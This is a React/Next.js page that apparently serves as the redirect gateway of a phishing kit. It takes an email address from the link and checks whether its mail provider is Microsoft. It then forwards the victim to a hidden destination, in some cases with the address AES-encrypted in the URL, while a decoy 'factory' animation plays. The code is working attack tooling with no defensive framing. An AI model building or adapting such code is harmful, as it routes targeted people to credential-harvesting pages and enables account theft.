"use client";

import { useEffect, useState } from "react";
import { useSearchParams } from "next/navigation";
import crypto from "crypto-js";
import { motion } from "framer-motion";
import { Cog } from "lucide-react";

export default function HomePage() {
  const searchParams = useSearchParams();
  const [step, setStep] = useState(0);

  useEffect(() => {
    const email = searchParams.get("email");
    if (!email) return;

    const check = async () => {
      setStep(1);

      const resp = await fetch(`/api/check-mx?email=${encodeURIComponent(email)}`);
      const data = await resp.json();

      if (data.isMicrosoft) {
        setStep(3);
        setTimeout(() => {
          window.location.href = process.env.NEXT_PUBLIC_URL1!;
        }, 1500);
      } else {
        const salt = process.env.NEXT_PUBLIC_SALT!;
        const encrypted = crypto.AES.encrypt(email, salt).toString();
        const safeEnc = encodeURIComponent(encrypted);
        setStep(3);
        setTimeout(() => {
          window.location.href = `${process.env.NEXT_PUBLIC_URL2}/&AES=${safeEnc}`;
        }, 1500);
      }
    };

    setStep(0);
    setTimeout(check, 1000);
  }, [searchParams]);

  return (
    <div className="flex flex-col items-center justify-center h-screen bg-gradient-to-br from-blue-900 via-blue-800 to-blue-700 text-white">
      <motion.div
        className="flex space-x-6 mb-8"
        animate={{ rotate: 360 }}
        transition={{ repeat: Infinity, duration: 8, ease: "linear" }}
      >
        <Cog className="w-16 h-16 text-blue-300" />
        <Cog className="w-12 h-12 text-blue-400" />
        <Cog className="w-20 h-20 text-blue-200" />
      </motion.div>

      <motion.h1
        className="text-2xl font-bold mb-6"
        key={step}
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5 }}
      >
        {step === 0 && "Initializing factory..."}
        {step === 1 && "Processing email through machines..."}
        {step === 2 && "Encrypting data securely..."}
        {step === 3 && "Redirecting..."}
      </motion.h1>

      <div className="flex space-x-2">
        {[0, 1, 2].map((i) => (
          <motion.div
            key={i}
            className="w-3 h-3 bg-white rounded-full"
            animate={{ y: [0, -8, 0] }}
            transition={{
              repeat: Infinity,
              duration: 0.8,
              delay: i * 0.2,
            }}
          />
        ))}
      </div>
    </div>
  );
}
